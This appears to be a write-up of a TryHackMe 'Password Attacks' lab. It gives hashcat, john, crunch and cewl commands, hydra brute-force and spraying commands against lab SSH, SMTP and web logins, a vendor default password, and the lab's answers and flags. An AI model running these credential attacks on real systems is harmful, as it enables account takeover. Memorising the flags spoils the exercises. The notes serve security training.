# Password Attacks - Hard

1. [Password Attacking Techniques](#password-attacking-techniques)
2. [Password Profiling - Default, Weak, Leaked, Combined and Username Wordlists](#password-profiling---default-weak-leaked-combined-and-username-wordlists)
3. [Password Profiling - Keyspace Technique and CUPP](#password-profiling---keyspace-technique-and-cupp)
4. [Offline Attacks - Dictionary and Brute-Force](#offline-attacks---dictionary-and-brute-force)
5. [Offline Attacks - Rule-Based](#offline-attacks---rule-based)
6. [Online Password Attacks](#online-password-attacks)
7. [Password Spray Attack](#password-spray-attack)

## Password Attacking Techniques

* Password cracking - for discovering passwords from encrypted/hashed data to plaintext data.

* Password guessing - guessing passwords for online protocols and services based on dictionaries.

```markdown
1. Which type of password attack is performed locally? - Password cracking
```

## Password Profiling - Default, Weak, Leaked, Combined and Username Wordlists

* Default passwords - Default passwords are set for products and services; we can [look](https://cirt.net/passwords) [it](https://default-password.info/) [up](https://datarecovery.com/rd/default-passwords/) and try.

* Weak passwords - weak passwords combined into wordlists such as SecLists

* Leaked passwords - part of sensitive data breached.

* Combined wordlists - combining multiple wordlists.

```shell
cat list1.txt list2.txt list3.txt > combined_list.txt

sort combined_list.txt | uniq -u > cleaned_list.txt
```

* Customized wordlists - creating custom password lists from target website.

```shell
cewl -w list.txt -d 5 -m 5 http://thm.labs
#crawl website using cewl and generate wordlist
#-m 5 gathers words with 5 or more chars
#-d 5 is depth level

cewl -w thm_pwd_list.txt -d 5 -m 8 https://clinic.thmredteam.com
```

* Username wordlists - generate username lists from target website; we can use tools such as username_generator.

```markdown
1. What is the Juniper Networks ISG 2000 default password? - netscreen:netscreen
```

## Password Profiling - Keyspace Technique and CUPP

* Keyspace technique - specifying a range of characters, numbers and symbols in wordlist.

```shell
crunch -h
#tool for creating offline wordlists

crunch 2 2 01234abcd -o crunch.txt
#all possible combinations of 2 characters
#2 letters minimum and maximum

crunch 6 6 -t pass%%
#password starts with 'pass'
#followed by two numbers
#-t for charsets
```

* CUPP (Common User Passwords Profiler) - for custom wordlists based on information related to target.

```markdown
1. Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate? - 81

2. What is the crunch command to generate a list containing THM@! and output to a filed named tryhackme.txt? - crunch 5 5 -t "THM^^" -o tryhackme.txt
```

## Offline Attacks - Dictionary and Brute-Force

* Dictionary attack - to guess passwords using well-known words/phrases.

* Brute-force attack - to guess victim's password by sending standard password combos; this does not use a wordlist.

```shell
hashcat -a 0 -m 100 "8d6e34f987851aa599257d3831a1af040886842f" /usr/share/wordlists/rockyou.txt

hashcat -a 3 -m 0 "e48e13207341b6bffb7fb1622282247b" "?d?d?d?d"
```

```markdown
1. Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type? - SHA-1

2. Perform a dictionary attack against the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the cracked value? Use rockyou.txt wordlist. - sunshine

3. Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9] - 1337
```

## Offline Attacks - Rule-Based

* Rule-based attacks (Hybrid attacks) - rules are applied to create passwords within password policy guidelines; manipulating or mangling a password.

```shell
john --wordlist=single-pwd.txt --rules=KoreLogic --stdout | wc -l
#using prebuilt rules
#we can also add custom rules
```

```markdown
1. What would the syntax you would use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@? - Az"[0-9][0-9]" ^[!@]
```

## Online Password Attacks

```shell
cewl -w thm_pwd_list.txt -d 5 -m 8 https://clinic.thmredteam.com
#create custom wordlist

#ftp has anonymous mode
ftp 10.10.44.215
#we can use that to get flag

#to add custom rule to jtr
sudo vim /etc/john/john.conf
#add custom rule

john --wordlist=thm_pwd_list.txt --rules=THM-Password --stdout > custom_thm_pwd_list.txt
#generate custom wordlist

hydra -l pittman@clinic.thmredteam.com -P custom_thm_pwd_list.txt smtp://10.10.44.215 -s 25
#attacking smtp

hydra -l phillips -P thm_pwd_list.txt 10.10.44.215 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php"
#attacking http-get-form
#gives password Paracetamol

john --wordlist=thm_pwd_list.txt --rules=Single-Extra --stdout > custom_thm_pwd_list.txt
#create custom wordlist again

hydra -l burgess -P custom_thm_pwd_list.txt 10.10.44.215 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php"
#attacking http-post-form
#gives password OxytocinnicotyxO
```

```markdown
1. Can you guess the FTP credentials without brute-forcing? What is the flag? - THM{d0abe799f25738ad739c20301aed357b}

2. What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9]. - !multidisciplinary00

3. Perform a brute-forcing attack against the phillips account for the login page at http://MACHINE_IP/login-get using hydra? What is the flag? - THM{33c5d4954da881814420f3ba39772644}

4. Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://MACHINE_IP/login-post/. What is the flag? - THM{f8e3750cc0ccbb863f2706a3b2933227}
```

## Password Spray Attack

* Password Spraying - targets many usernames using one common weak password, to avoid an account lockout policy.

* Common, weak passwords follow patterns and formats; we might have to add rule-based passwords as well.

```shell
#for ssh
hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10

#for rdp
#we can use tool RDPassSpray
python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
#we can use -d for domain in AD environment

#for ssh password spraying
#we have been given usernames list
#we need to spray different passwords according to hint
#we can create passwords list based on hint
hydra -L usernames-list.txt -P passwords-list.txt ssh://10.10.44.215
#this gives creds burgess:Fall2021@
#log into ssh to get flag
```

```markdown
1. Perform a password spraying attack to get access to the SSH://MACHINE_IP server to read /etc/flag. What is the flag? - THM{a97a26e86d09388bbea148f4b870277d}
```
